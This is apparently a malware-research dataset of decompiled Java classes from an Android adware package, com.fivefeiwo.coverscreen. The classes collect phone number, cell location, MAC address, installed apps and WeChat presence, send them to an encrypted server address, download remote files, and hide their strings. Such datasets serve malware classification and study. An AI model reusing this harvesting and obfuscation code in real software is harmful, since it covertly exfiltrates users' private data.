"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\drawable.code","public static final class drawable {   public static final int app_icon=0x7f020000; } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\E.code","final class E implements DownloadListener {   private WA a;   public E(  WA wa){     this.a=wa;   }   @Override public final void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){     this.a.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\F.code","public final class F extends WebChromeClient {   private WA a;   public F(  WA wa){     this.a=wa;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     this.a.setProgress(i * 100);     WA.a(this.a,""å·²åŠ è½½ >> _feiwocp"".replace(""_feiwocp"","""") + i + ""%"");     if (i >= 100) {       WA.a(this.a,null);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\G.code","public final class G extends WebViewClient {   private WA a;   public G(  WA wa){     this.a=wa;   }   @Override public final void onPageFinished(  WebView webView,  String str){     this.a.a.getSettings().setBlockNetworkImage(false);     super.onPageFinished(webView,str);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     if (this.a.b.equalsIgnoreCase(str2) || (this.a.b + ""/"").equalsIgnoreCase(str2)) {       this.a.a.loadData(""<h1>Page load Error !</h1>_feiwocp"".replace(""_feiwocp"",""""),""text/html_feiwocp"".replace(""_feiwocp"",""""),""UTF-8_feiwocp"".replace(""_feiwocp"",""""));       this.a.c=true;     }     WA.a(this.a,""åŠ è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\H.code","public class H {   private int a;   private String b;   private String c;   private String d;   private String e;   public H(){   }   public H(  int i,  String str,  String str2,  String str3,  String str4){     this.a=i;     this.b=str;     this.c=str2;     this.d=str3;     this.e=str4;   }   public static JSONObject a(  Context context,  double d,  double d2,  String str,  int i,  String str2,  String str3){     String a=ai.a(context);     String c=J.a(context).c();     String d3=J.a(context).d();     String b=J.a(context).b();     String a2=J.a(context).a();     String c2=ai.c(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""type_feiwocp"".replace(""_feiwocp"",""""),0);       jSONObject.put(""lat_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""lon_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""cellid_feiwocp"".replace(""_feiwocp"",""""),c);       jSONObject.put(""lac_feiwocp"".replace(""_feiwocp"",""""),d3);       jSONObject.put(""mcc_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""url_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  int i){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),i);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str){     String a=ai.a(context);     String b=J.a(context).b();     String a2=ai.a();     ao d=ai.d(context);     ah.a();     boolean a3=ah.a(context,""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""));     int b2=P.b(context);     String str2=ac.c().a() + "":"" + ac.c().b();     String c=J.a(context).c();     String d2=J.a(context).d();     String str3=(aq.a(c) || aq.a(d2)) ? """" : c + "":"" + d2;     String c2=ai.c(context);     String b3=ai.b();     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""latlon_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""cidlac_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""width_feiwocp"".replace(""_feiwocp"",""""),d.a);       jSONObject.put(""weixinflag_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""networktype_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a=ai.a(context);     String b=ai.b();     ah.a();     String a2=ah.a(context,false);     String str3=ai.d(context).a + ""*"" + ai.d(context).b;     String a3=ai.a();     String d=ai.d();     String c=ai.c();     String c2=J.a(context).c();     String b2=J.a(context).b();     String e=J.a(context).e();     ao d2=ai.d(context);     String str4=d2.a + ""*"" + d2.b;     String b3=ai.b(context);     String c3=ai.c(context);     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""packagenames_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""resolution_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""versionrelease_feiwocp"".replace(""_feiwocp"",""""),d);       jSONObject.put(""versioncode_feiwocp"".replace(""_feiwocp"",""""),c);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c3);       jSONObject.put(""call_id_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""mac_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""screen_size_feiwocp"".replace(""_feiwocp"",""""),str4);       jSONObject.put(""mobile_num_feiwocp"".replace(""_feiwocp"",""""),e);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e2) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  JSONArray jSONArray){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""installCount_feiwocp"".replace(""_feiwocp"",""""),jSONArray);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public int e(){     return this.a;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\I.code","public final class I {   private static final String a=R.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo=_feiwocp"".replace(""_feiwocp"",""""),R.a(""123456_feiwocp"".replace(""_feiwocp"","""")));   public static String a(){     return a + ""/webviewAdClick_feiwocp"".replace(""_feiwocp"","""");   }   public static String b(){     return a + ""/showCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String c(){     return a + ""/"" + ""clientinfo_feiwocp"".replace(""_feiwocp"","""");   }   public static String d(){     return a + ""/installCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String e(){     return a + ""/getCoverScreenAdList_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\J.code","public class J {   private static J a;   private String b;   private String c;   private String d;   private String e;   private String f;   public J(){   }   private J(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone_feiwocp"".replace(""_feiwocp"",""""));       String networkOperator=telephonyManager.getNetworkOperator();       this.b=networkOperator.substring(0,3);       this.c=networkOperator.substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(cdmaCellLocation.getBaseStationId());         this.e=String.valueOf(cdmaCellLocation.getNetworkId());         this.f=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(gsmCellLocation.getCid());         this.e=String.valueOf(gsmCellLocation.getLac());         this.f=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static J a(  Context context){     if (a == null) {       a=new J(context);     }     return a;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public String e(){     return aq.a(this.f) ? """" : this.f;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\K.code","public final class K {   private static K a=null;   private ExecutorService b;   private Map c=new HashMap();   private int d=0;   private int e=0;   private K(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static K a(){     if (a == null) {       a=new K();     }     return a;   }   public static void a(  String str,  String str2){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     r2=null;     fileOutputStream2=null;     HttpURLConnection httpURLConnection3=null;     FileOutputStream fileOutputStream3=null;     File file=new File(str2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(str2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(20000);         httpURLConnection2.setReadTimeout(20000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         InputStream inputStream=httpURLConnection2.getInputStream();         FileOutputStream fileOutputStream4=new FileOutputStream(file);         try {           byte[] bArr=new byte[1024];           while (true) {             int read=inputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream4.write(bArr,0,read);             }           }           fileOutputStream4.flush();           fileOutputStream4.close();           file.renameTo(file2);           try {             fileOutputStream4.close();             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          IOException e) {           }         }  catch (        FileNotFoundException e2) {           httpURLConnection3=httpURLConnection2;           fileOutputStream=fileOutputStream4;           if (fileOutputStream != null) {             try {               fileOutputStream.close();             }  catch (            IOException e3) {               return;             }           }           if (httpURLConnection3 != null) {             httpURLConnection3.disconnect();           }         } catch (        IOException e4) {           fileOutputStream3=fileOutputStream4;           if (fileOutputStream3 != null) {             try {               fileOutputStream3.close();             }  catch (            IOException e5) {               return;             }           }           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         } catch (        Throwable th) {           fileOutputStream2=fileOutputStream4;           httpURLConnection=httpURLConnection2;           th=th;           if (fileOutputStream2 != null) {             try {               fileOutputStream2.close();             }  catch (            IOException e6) {               throw th;             }           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      FileNotFoundException e7) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      IOException e8) {       } catch (      Throwable th2) {         httpURLConnection=httpURLConnection2;         th=th2;       }     }  catch (    FileNotFoundException e9) {       fileOutputStream=null;     } catch (    IOException e10) {       httpURLConnection2=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;     }   }   public final Bitmap a(  Context context,  String str){     int i;     Bitmap bitmap;     int i2;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i3=options.outWidth;     int i4=options.outHeight;     int i5=i3;     int i6=1;     while (true) {       int i7=i4;       int i8=i5 / 2;       if (this.d > 0) {         i=this.d;       }  else {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);         this.d=displayMetrics.widthPixels;         i=displayMetrics.widthPixels;       }       if (i8 <= i) {         break;       }       int i9=i7 / 2;       if (this.e > 0) {         i2=this.e;       }  else {         DisplayMetrics displayMetrics2=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics2);         this.e=displayMetrics2.heightPixels;         i2=this.e;       }       if (i9 <= i2) {         break;       }       i5/=2;       i4=i7 / 2;       i6<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i6;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public final Drawable a(  Context context,  String str,  String str2){     if (str == null || str.equals("""")) {       return null;     }     File file=new File(str2);     if (!file.exists()) {       return null;     }     try {       file.setLastModified(System.currentTimeMillis());       return new BitmapDrawable(a(context,str2));     }  catch (    Exception e) {       return null;     } catch (    OutOfMemoryError e2) {       return null;     }   }   public final Drawable a(  Context context,  String str,  String str2,  N n){     if (this.c.containsKey(str)) {       SoftReference softReference=(SoftReference)this.c.get(str);       if (softReference.get() != null) {         if (0 != 0) {           softReference.get();         }         return (Drawable)softReference.get();       }     }     this.b.submit(new M(this,context,str,str2,true,new L(this,null,str)));     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\L.code","final class L extends Handler {   private N a;   private String b;   public L(  K k,  N n,  String str){     this.a=n;     this.b=str;   }   @Override public final void handleMessage(  Message message){     if (message.obj == null || this.a == null) {       return;     }     N n=this.a;     Object obj=message.obj;     String str=this.b;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\M.code","public final class M implements Runnable {   private Context a;   private String b;   private String c;   private boolean d;   private Handler e;   private K f;   public M(  K k,  Context context,  String str,  String str2,  boolean z,  Handler handler){     this.f=k;     this.a=context;     this.b=str;     this.c=str2;     this.d=z;     this.e=handler;   }   @Override public final void run(){     Map map;     Drawable a=this.f.a(this.a,this.b,this.c);     new StringBuilder().append(""loadDrawable from method: getDrawableFromCache, drawable: "").append(a).append("", url: "").append(this.b);     if (a == null) {       try {         new StringBuilder().append(""save to file start: "").append(this.c).append("", url: "").append(this.b);         K k=this.f;         Context context=this.a;         K.a(this.b,this.c);         a=this.f.a(this.a,this.b,this.c);       }  catch (      IOException e) {         a=null;         new StringBuilder().append(""save to file failed: "").append(this.c).append("", url: "").append(this.b);       }     }     if (this.d && a != null) {       map=this.f.c;       map.put(this.b,new SoftReference(a));     }     this.e.sendMessage(this.e.obtainMessage(0,a));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\N.code","public interface N { } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\O.code","public final class O {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] c; static {     int[] iArr=new int[256];     b=iArr;     Arrays.fill(iArr,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     byte[] bArr={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       c[i5]=(byte)((i5 - 48) + 52);     }     c[43]=62;     c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.O.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\P.code","public class P {   static P a;   ConcurrentLinkedQueue b;   Map c;   Context d;   Handler e;   public P(){   }   private P(  Context context){     this.b=new ConcurrentLinkedQueue();     this.c=new ConcurrentHashMap();     this.d=context;     this.e=new Handler();   }   public static P a(){     if (a == null) {       throw new RuntimeException(""DownloadManager is not yet initialize_feiwocp"".replace(""_feiwocp"",""""));     }     return a;   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public static int b(  Context context){     boolean z=true;     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) {       return 0;     }     String typeName=activeNetworkInfo.getTypeName();     if (typeName.equalsIgnoreCase(""WIFI_feiwocp"".replace(""_feiwocp"",""""))) {       return 4;     }     if (!typeName.equalsIgnoreCase(""MOBILE_feiwocp"".replace(""_feiwocp"",""""))) {       return 0;     }     if (!aq.a(Proxy.getDefaultHost())) {       return 1;     } switch (((TelephonyManager)context.getSystemService(""phone"")).getNetworkType()) { case 1:       z=false;     break; case 2:   z=false; break; case 4: z=false; break; case MotionEventCompat.ACTION_HOVER_MOVE: z=false; break; case 11: z=false; break; } return z ? 3 : 2; } public static void c(Context context){ a=new P(context); } public void a(H h){ new StringBuilder().append(""[DownloadManager] removeTask: "").append(h.a()).append("","").append(h.d()); this.c.remove(h.d()); } public void a(H h,T t){ new StringBuilder().append(""[DownloadManager] addTask: "").append(h.a()).append("","").append(h.d()); U u=(U)this.c.get(h.d()); if (u != null) { u.a(t); return; } U u2=new U(this,h,t); this.c.put(h.d(),u2); u2.start(); } public boolean a(String str){ return this.c.containsKey(str); } public void b(){ U u=(U)this.b.poll(); while (u != null) { a(u.b,(T)u.a.poll()); u=(U)this.b.poll(); } } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\Q.code","public final class Q implements Serializable {   public static final String a=""download_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""weixin_feiwocp"".replace(""_feiwocp"","""");   public static final String c=""weburl_feiwocp"".replace(""_feiwocp"","""");   private int d;   private int e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String n;   private String o;   private String p;   private String q;   private String r;   private String s;   private String t;   public static Q a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     Q q=new Q();     q.d=jSONObject.optInt(""id_feiwocp"".replace(""_feiwocp"",""""));     q.e=jSONObject.optInt(""adid_feiwocp"".replace(""_feiwocp"",""""),0);     q.f=jSONObject.optString(""image_feiwocp"".replace(""_feiwocp"",""""));     q.g=jSONObject.optString(""name_feiwocp"".replace(""_feiwocp"",""""));     q.i=jSONObject.optString(""icon_feiwocp"".replace(""_feiwocp"",""""));     q.q=jSONObject.optString(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.r=jSONObject.optString(""notifiKeep_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.s=jSONObject.optString(""gprsDown_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.h=jSONObject.optString(""clickType_feiwocp"".replace(""_feiwocp"",""""));     q.t=jSONObject.optString(""fullClick_feiwocp"".replace(""_feiwocp"",""""),""true"");     q.l=jSONObject.optString(""appicon_feiwocp"".replace(""_feiwocp"",""""));     q.m=jSONObject.optString(""appname_feiwocp"".replace(""_feiwocp"",""""));     q.n=jSONObject.optString(""apppackage_feiwocp"".replace(""_feiwocp"",""""));     q.o=jSONObject.optString(""appurl_feiwocp"".replace(""_feiwocp"",""""));     q.p=jSONObject.optString(""appsize_feiwocp"".replace(""_feiwocp"",""""));     q.j=jSONObject.optString(""wxurl_feiwocp"".replace(""_feiwocp"",""""));     q.k=jSONObject.optString(""weburl_feiwocp"".replace(""_feiwocp"",""""));     return q;   }   public final int a(){     return this.e;   }   public final String b(){     return this.f;   }   public final String c(){     return this.g;   }   public final String d(){     return this.m;   }   public final String e(){     return this.n;   }   public final String f(){     return this.o;   }   public final String g(){     return this.j;   }   public final String h(){     return this.h;   }   public final String i(){     return this.k;   }   public final String j(){     return this.i;   }   public final String k(){     return this.l;   }   public final String l(){     return this.p;   }   public final int m(){     return this.d;   }   public final String n(){     return this.q;   }   public final String o(){     return this.r;   }   public final String p(){     return this.s;   }   public final String q(){     return this.t;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\R.code","public final class R { public static final class drawable {     public static final int app_icon=0x7f020000;   } public static final class string {     public static final int app_name=0x7f030000;   } static {     ""CryptUtils.java_feiwocp"".replace(""_feiwocp"","""");     char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   }   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     if (str == null) {       return null;     }     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     if (str == null) {       return null;     }     return O.a(b(str,str2),false);   }   private static byte[] b(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] bytes=str.getBytes(""utf-8_feiwocp"".replace(""_feiwocp"",""""));       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       return null;     } catch (    InvalidKeyException e2) {       return null;     } catch (    NoSuchAlgorithmException e3) {       return null;     } catch (    BadPaddingException e4) {       return null;     } catch (    IllegalBlockSizeException e5) {       return null;     } catch (    NoSuchPaddingException e6) {       return null;     }   }   private static byte[] c(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] a=O.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException e) {       return null;     } catch (    NoSuchAlgorithmException e2) {       return null;     } catch (    BadPaddingException e3) {       return null;     } catch (    IllegalBlockSizeException e4) {       return null;     } catch (    NoSuchPaddingException e5) {       return null;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0007f.code","public final class RunnableC0007f implements Runnable {   private String a;   private AbstractC0002a b;   public RunnableC0007f(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0008g.code","public final class RunnableC0008g implements Runnable {   private String a;   private AbstractC0002a b;   public RunnableC0008g(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0009h.code","public final class RunnableC0009h implements Runnable {   private Intent a;   private AbstractC0002a b;   public RunnableC0009h(  AbstractC0002a abstractC0002a,  Intent intent){     this.b=abstractC0002a;     this.a=intent;   }   @Override public final void run(){     Context context;     context=this.b.d;     context.startActivity(this.a);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0012k.code","final class RunnableC0012k implements Runnable {   private SA a;   public RunnableC0012k(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\RunnableC0013l.code","final class RunnableC0013l implements Runnable {   private SA a;   public RunnableC0013l(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
